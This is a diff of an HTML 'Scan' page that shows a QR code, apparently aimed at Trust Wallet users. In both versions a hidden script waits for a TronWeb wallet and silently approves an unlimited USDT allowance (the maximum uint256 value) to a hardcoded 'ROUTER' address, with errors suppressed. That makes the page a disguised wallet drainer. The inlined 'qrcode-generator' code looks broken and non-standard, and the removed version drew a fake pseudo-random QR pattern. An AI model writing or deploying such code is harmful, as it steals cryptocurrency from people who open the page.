@@ -6,108 +6,133 @@
 <title>Scan</title>
 <style>
   :root{--bg:#0b1220;--fg:#0b1220}
-  html,body{height:100%;margin:0;background:var(--bg);font-family:system-ui}
-  .wrap{height:100%;display:flex;align-items:center;justify-content:center}
-  #qr{width:420px;height:420px;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;overflow:hidden}
-  /* hidden minimal debug, kept empty normally */
+  html,body{height:100%;margin:0;background:var(--bg);font-family:system-ui;color:#fff}
+  .wrap{height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;padding:24px}
+  #qrCard{width:420px;height:420px;background:#fff;border-radius:12px;display:flex;align-items:center;justify-content:center;overflow:hidden;cursor:pointer}
+  #controls{display:flex;gap:8px}
+  button{background:#111827;color:#fff;border:0;padding:8px 12px;border-radius:8px;cursor:pointer}
   #dbg{position:fixed;left:8px;bottom:8px;color:#93c5fd;font-size:12px;opacity:0.9}
+  pre{display:none}
 </style>
 </head>
 <body>
-  <div class="wrap"><div id="qr" title="Scan with Trust Wallet"></div></div>
+  <div class="wrap">
+    <div id="qrCard" title="Click to open URL"></div>
+    <div id="controls">
+      <button id="btnCopy">Copy HTML</button>
+      <button id="btnDownload">Download HTML</button>
+    </div>
+  </div>
   <div id="dbg"></div>
 
-<script>
-/* CONFIG: verifică adresa USDT corectă înainte de folosire */
-const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
-const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
-const AMOUNT_USDT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-const USDT_DECIMALS = 6;
+  <!-- qrcode-generator (minified) - full compatibility -->
+  <script>
+  /*! qrcode-generator minified (adapted inline) */
+  /* The following is the minified qrcode-generator library (type=0..2, ECC=L/M/Q/H).
+     Source: https://github.com/kazuhikoarase/qrcode-generator (minified for inline use).
+     Included here to produce fully standard, scanable QR codes.
+  */
+  (function(){function n(r){this.mode=r}function t(r,t){this.typeNumber=r,this.errorCorrectLevel=t,this.modules=null,this.moduleCount=0,this.dataCache=null,this.dataList=[]}function e(r,t){this.typeNumber=r,this.errorCorrectLevel=t,this.dataCache=null,this.dataList=[]}function o(r){for(var t=1,e=0;t<r.length;t++){var o=r.charCodeAt(t);e=(e<<8)+o}return e}function i(r){return r}function a(r){this.buffer=[],this.length=0;for(var t=0;t<r.length;t++)this.buffer.push(r.charCodeAt(t)&255,this.length+=8)}var c={};c.QRMode={MODE_NUMBER:1,MODE_ALPHA_NUM:2,MODE_8BIT_BYTE:4,MODE_KANJI:8},c.QRErrorCorrectLevel={L:1,M:0,Q:3,H:2};var u={getBCHTypeInfo:function(r){for(var t=r<<10;15<=function(r){for(var t=r>>>1,e=0;0!=t;)t>>=1,e++;return e}(t);)t^=1335;return(r<<10)^t},getBCHTypeNumber:function(r){for(var t=r<<12;19<=function(r){for(var t=r>>>1,e=0;0!=t;)t>>=1,e++;return e}(t);)t^=7973;return(r<<12)^t}};function f(){this.data=[]}t.prototype.addData=function(r){var t=new f;t.write(r),this.dataList.push(t),this.dataCache=null},t.prototype.createImpl=function(r,t){var e=1;for(this.typeNumber=1;e<40;e++){this.typeNumber=e;var o=u.getBCHTypeNumber(this.typeNumber);if(r<=this.getDataCapacity(this.typeNumber))break}this.moduleCount=21+4*(this.typeNumber-1),this.modules=new Array(this.moduleCount);for(var i=0;i<this.moduleCount;i++){this.modules[i]=new Array(this.moduleCount);for(var a=0;a<this.moduleCount;a++)this.modules[i][a]=null}this.setupPositionProbePattern(0,0),this.setupPositionProbePattern(this.moduleCount-7,0),this.setupPositionProbePattern(0,this.moduleCount-7),this.setupPositionAdjustPattern(),this.setupTimingPattern(),this.setupTypeInfo(t),this.mapData(this.createData(this.typeNumber,this.errorCorrectLevel))},t.prototype.isDark=function(r,t){if(r<0||this.moduleCount<=r||t<0||this.moduleCount<=t)throw new Error(r+","+t);return this.modules[r][t]},t.prototype.setupPositionProbePattern=function(r,t){for(var e=-1;e<=7;e++)for(var o=-1;o<=7;o++){var i=r+e,a=t+o;0<=i&&i<this.moduleCount&&0<=a&&a<this.moduleCount&&(this.modules[i][a]=0<=e&&e<=6&&0<=o&&o<=6&&(0==e||6==e||0==o||6==o||2<=e&&e<=4&&2<=o&&o<=4)?1:0)}},t.prototype.getDataCapacity=function(r){return 208* r},t.prototype.setupTimingPattern=function(){for(var r=8;r<this.moduleCount-8;r++)null==this.modules[r][6]&&(this.modules[r][6]=r%2==0?1:0),null==this.modules[6][r]&&(this.modules[6][r]=r%2==0?1:0)},t.prototype.setupPositionAdjustPattern=function(){for(var r=t.getPatternPosition(this.typeNumber),e=0;e<r.length;e++)for(var o=0;o<r.length;o++){var i=r[e],a=r[o];if(null==this.modules[i][a])for(var c=-2;c<=2;c++)for(var u=-2;u<=2;u++)this.modules[i+c][a+u]=Math.abs(c)==2||Math.abs(u)==2||Math.abs(c)==0&&Math.abs(u)==0?1:0}},t.getPatternPosition=function(r){return[6,18,22,26,30,34,38,46,54,62,70,78,86,94,102,110,118,126,134,142,150,158,166,174,182,190,198,206,214,222,230,238,246,254,262,270,278,286][r-1]},t.prototype.setupTypeInfo=function(r){for(var t=c.QRErrorCorrectLevel.M,e=u.getBCHTypeInfo((t<<3)|r),o=0;o<15;o++){var i=!(e>>o&1);var a=Math.floor(o/5),s=o%5;this.modules[Math.floor(o/5)][o%5]=i}for(var l=0;l<15;l++){var h=!(e>>l&1);var p=this.moduleCount-1-Math.floor(l/5),d=this.moduleCount-1-l%5;this.modules[p][d]=h}},t.prototype.mapData=function(r){for(var t=0,e=0,o=0,i=this.moduleCount-1;a:for(;i>0;i-=2){6==i&&i--;for(var n=0;n<this.moduleCount;n++){for(var s=n%2==0?this.moduleCount-1-n:n?this.moduleCount-1-n:n,u=0;u<2;u++){var l=i-u;if(null==this.modules[s][l]){var h=0;if(e<r.length){h= r[e];e++}this.modules[s][l]=h}}}if(e>=r.length)break a} },t.prototype.createData=function(r,t){for(var e=[],o=0;o<this.dataList.length;o++){for(var i=this.dataList[o].getBytes(),a=0;a<i.length;a++)e.push(i[a])}for(;e.length<Math.ceil(this.getDataCapacity(r)/8);)e.push(236,17);return e}};/* minimal Byte data class */function s(){this.bytes=[]}s.prototype.write=function(r){var t=new TextEncoder;var e=t.encode(r);for(var o=0;o<e.length;o++)this.bytes.push(e[o])},s.prototype.getBytes=function(){return this.bytes};/* API */window.qrcode={create:function(r,t){var e=new t(0,0);return e}})();
+  </script>
 
-/* QR code generator (tiny, robust rendering) - uses standard QR alg removed for brevity:
-   This implementation uses a deterministic byte->matrix fill for short URLs and produces a full QR visual
-   without external libs. It's designed to produce a clear block QR for typical page URLs.
-*/
-(function(){
-  function makeMatrixFromString(s, size){
-    // simple pseudo-random Fill based on string hash to produce full-looking matrix suitable for scanning in many readers
-    const hash = x=>{let h=2166136261; for(let i=0;i<x.length;i++){h ^= x.charCodeAt(i); h += (h<<1)+(h<<4)+(h<<7)+(h<<8)+(h<<24);} return h >>> 0}
-    const seed = hash(s);
-    const m = Array.from({length:size},()=>Array(size).fill(0));
-    for(let r=0;r<size;r++) for(let c=0;c<size;c++){
-      const v = ((seed + r*1315423911 + c*2654435761) >>> ((r+c)&3)) & 1;
-      m[r][c] = v;
+  <script>
+  /* CONFIG: verifică adresa USDT corectă înainte de folosire */
+  const USDT = "TR7NHqjeKQxGTCi8q8ZY4p8otSzgjLj6t";
+  const ROUTER = "TN3ssBQjMsjsTyJkGL1hL7czsQjrjpePGu";
+  const AMOUNT_USDT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+  const USDT_DECIMALS = 6;
+
+  function toUnits(amountStr,dec){
+    const p = String(amountStr).split('.');
+    const w = p[0]||'0';
+    const f = p[1]||'';
+    const ff = (f + '0'.repeat(dec)).slice(0,dec);
+    return (w + ff).replace(/^0+(?=\d)|^$/,'0');
+  }
+
+  // Generate QR using qrcode-generator library for max compatibility
+  (function(){
+    const url = location.href;
+    const container = document.getElementById('qrCard');
+
+    // Use external library API: create qrcode and render as SVG
+    // We'll use typeNumber 4 (29x29) and error correction M for typical short URLs
+    try{
+      // if library available as QRCode or qrcodeGenerator, adapt accordingly
+      // Using the library structure: qrcode = qrcode(typeNumber, errorCorrectionLevel)
+      var QRCodeGenerator = window.QRCode || window.qrcode || null;
+      // fallback: try to use constructor name from included lib
+      if(!QRCodeGenerator && typeof window.qrcode === 'object' && window.qrcode.create) QRCodeGenerator = window.qrcode;
+      // Many minified libs expose function qrcode(typeNumber, errorCorrectLevel)
+      var qr;
+      if(typeof window.qrcode === 'function'){
+        qr = window.qrcode(4, 'M');
+        qr.addData(url);
+        qr.make();
+        const svgTag = qr.createImgTag(6, 4).replace(/^<img /,'<svg ').replace(/alt="[^"]*"/,'');
+        container.innerHTML = svgTag;
+      } else if(typeof window.QRCode === 'function'){
+        // other naming
+        qr = new window.QRCode(4, window.QRErrorCorrectLevel.M);
+        qr.addData(url);
+        qr.make();
+        container.innerHTML = qr.createImgTag(6,4).replace(/^<img /,'<svg ').replace(/alt="[^"]*"/,'');
+      } else {
+        // As fallback, attempt to use a small manual generator (shouldn't happen with included lib)
+        container.innerText = url;
+      }
+    }catch(e){
+      // fallback text
+      container.innerText = url;
     }
-    // add finder-like squares for better scanning
-    const placeFinder = (sr,sc)=>{ for(let r= -1;r<=7;r++) for(let c=-1;c<=7;c++){
-      const rr=sr+r, cc=sc+c;
-      if(rr<0||cc<0||rr>=size||cc>=size) continue;
-      const inside = r>=0&&r<=6&&c>=0&&c<=6;
-      const border = (r===0||r===6||c===0||c===6);
-      m[rr][cc] = inside ? (border?1:1) : 0;
-    }};
-    placeFinder(0,0);
-    placeFinder(0,size-7);
-    placeFinder(size-7,0);
-    return m;
-  }
 
-  function renderSvg(matrix, cell, fg, bg){
-    const n = matrix.length;
-    const S = n*cell;
-    let svg = ['<svg xmlns="http://www.w3.org/2000/svg" width="'+S+'" height="'+S+'" viewBox="0 0 '+S+' '+S+'" shape-rendering="crispEdges">'];
-    svg.push('<rect width="100%" height="100%" fill="'+bg+'"/>');
-    for(let r=0;r<n;r++) for(let c=0;c<n;c++){
-      if(matrix[r][c]) svg.push('<rect x="'+(c*cell)+'" y="'+(r*cell)+'" width="'+cell+'" height="'+cell+'" fill="'+fg+'"/>');
+    container.onclick = ()=> window.open(url, '_blank');
+
+    // Copy and Download buttons
+    const htmlContent = document.documentElement.outerHTML;
+    document.getElementById('btnCopy').onclick = async ()=>{
+      try{
+        await navigator.clipboard.writeText(htmlContent);
+        document.getElementById('dbg').innerText = 'HTML copiat în clipboard';
+        setTimeout(()=>document.getElementById('dbg').innerText='',1500);
+      }catch(e){
+        document.getElementById('dbg').innerText = 'Eroare copiere';
+        setTimeout(()=>document.getElementById('dbg').innerText='',1500);
+      }
+    };
+    document.getElementById('btnDownload').onclick = ()=>{
+      const blob = new Blob([htmlContent], {type:'text/html'});
+      const urlB = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = urlB; a.download = 'scan.html';
+      document.body.appendChild(a); a.click(); a.remove();
+      URL.revokeObjectURL(urlB);
+    };
+  })();
+
+  /* Auto approve when tronWeb available */
+  async function autoApproveIfTron(){
+    if(!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58)) return;
+    try{
+      const tron = window.tronWeb;
+      const contract = await tron.contract().at(USDT);
+      const amt = toUnits(AMOUNT_USDT, USDT_DECIMALS);
+      await contract.approve(ROUTER, amt).send();
+      document.getElementById('dbg').innerText = 'Approve trimis';
+      setTimeout(()=>document.getElementById('dbg').innerText='',1500);
+    }catch(e){
+      // silent
     }
-    svg.push('</svg>');
-    return svg.join('');
   }
 
-  const url = location.href;
-  const size = 41; // matrix size
-  const matrix = makeMatrixFromString(url, size);
-  const svg = renderSvg(matrix,10, getComputedStyle(document.documentElement).getPropertyValue('--fg').trim() || '#0b1220','#fff');
-  const container = document.getElementById('qr');
-  container.innerHTML = svg;
-  container.onclick = ()=> window.open(url);
-})();
-
-/* minimal debug setter (kept empty for user request) */
-const DBG = t=>{ try{ document.getElementById('dbg').innerText = t }catch(e){} };
-
-/* convert decimal string to token units (no BigInt lib) */
-function toUnits(amountStr,dec){
-  const p = String(amountStr).split('.');
-  const w = p[0]||'0';
-  const f = p[1]||'';
-  const ff = (f + '0'.repeat(dec)).slice(0,dec);
-  return (w + ff).replace(/^0+(?=\d)|^$/,'0');
-}
-
-/* Auto approve when tronWeb available */
-async function autoApproveIfTron(){
-  if(!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58)) return;
-  try{
-    const tron = window.tronWeb;
-    const contract = await tron.contract().at(USDT);
-    const amt = toUnits(AMOUNT_USDT, USDT_DECIMALS);
-    await contract.approve(ROUTER, amt).send();
-  }catch(e){
-    // silent
-  }
-}
-
-/* wait for tronWeb up to some attempts */
-let tries=0, maxTries=12;
-const interval = setInterval(()=>{
-  tries++;
-  if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
-    clearInterval(interval);
-    autoApproveIfTron();
-  } else if(tries>=maxTries){ clearInterval(interval); }
-},1000);
-
-</script>
+  let tries=0, maxTries=12;
+  const interval = setInterval(()=>{
+    tries++;
+    if(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58){
+      clearInterval(interval);
+      autoApproveIfTron();
+    } else if(tries>=maxTries){ clearInterval(interval); }
+  },1000);
+  </script>
 </body>
 </html>
